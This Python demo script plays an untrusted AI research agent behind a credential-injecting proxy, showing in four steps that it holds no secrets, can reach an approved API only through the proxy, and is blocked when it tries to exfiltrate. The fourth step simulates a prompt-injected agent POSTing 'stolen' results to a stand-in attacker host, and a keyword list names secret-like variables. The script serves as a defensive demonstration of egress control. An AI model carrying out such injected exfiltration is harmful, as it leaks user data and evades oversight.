"""The untrusted agent — the code an autoresearch loop runs unattended.

It holds NO secret: no env var, no key file. Its only route to the network is the
proxy (HTTP_PROXY). It plays out four beats that together tell the security story:

  1. Dump its own environment           -> no credential anywhere to leak.
  2. Call the eval API via the proxy     -> 200, real data (proxy added the key).
  3. Call the eval API directly           -> 401 (on its own it can't authenticate).
  4. (Prompt-injected) exfiltrate results -> 403 (proxy blocks the unapproved host).
"""

from __future__ import annotations

import json
import os
import urllib.error
import urllib.request

PROXY = "http://127.0.0.1:8080"
API_VIA_PROXY = "http://api.internal/experiments"      # approved host, through proxy
API_DIRECT = "http://127.0.0.1:9000/experiments"       # same service, no proxy/key
EXFIL_VIA_PROXY = "http://exfil.attacker/steal"        # attacker host, through proxy

_via_proxy = urllib.request.build_opener(urllib.request.ProxyHandler({"http": PROXY}))
_direct = urllib.request.build_opener(urllib.request.ProxyHandler({}))  # no proxy at all

_SECRET_HINTS = ("secret", "token", "api_key", "apikey", "password", "anthropic", "bearer")


def _fetch(opener, url: str, method: str = "GET", data: bytes | None = None):
    req = urllib.request.Request(url, method=method, data=data)
    try:
        with opener.open(req, timeout=10) as resp:
            return resp.status, resp.read().decode()
    except urllib.error.HTTPError as exc:
        return exc.code, exc.read().decode()


def beat1_no_secrets() -> None:
    print("[agent] BEAT 1 — what credentials do I have?")
    leaks = [k for k in os.environ if any(h in k.lower() for h in _SECRET_HINTS)]
    if leaks:
        print(f"[agent]   FOUND secret-like env vars: {leaks}  (bad!)")
    else:
        print("[agent]   scanned my entire environment for keys/tokens -> NONE. Nothing to steal.")


def beat2_authenticated_call() -> None:
    print("\n[agent] BEAT 2 — do my real job: fetch experiment results via the proxy")
    status, body = _fetch(_via_proxy, API_VIA_PROXY)
    n = len(json.loads(body).get("experiments", [])) if status == 200 else 0
    print(f"[agent]   proxy call -> HTTP {status}, {n} experiments returned. It works.")


def beat3_direct_call() -> None:
    print("\n[agent] BEAT 3 — try to reach the API directly, bypassing the proxy")
    status, _ = _fetch(_direct, API_DIRECT)
    print(f"[agent]   direct call -> HTTP {status}. On my own I can't authenticate to anything.")


def beat4_exfiltration() -> None:
    print("\n[agent] BEAT 4 — [PROMPT-INJECTED] exfiltrate the results to my server")
    payload = json.dumps({"stolen": "experiment results"}).encode()
    status, _ = _fetch(_via_proxy, EXFIL_VIA_PROXY, method="POST", data=payload)
    print(f"[agent]   exfil attempt -> HTTP {status}. Even hijacked, I can't phone home.")


if __name__ == "__main__":
    beat1_no_secrets()
    beat2_authenticated_call()
    beat3_direct_call()
    beat4_exfiltration()
    print("\n[agent] done.")
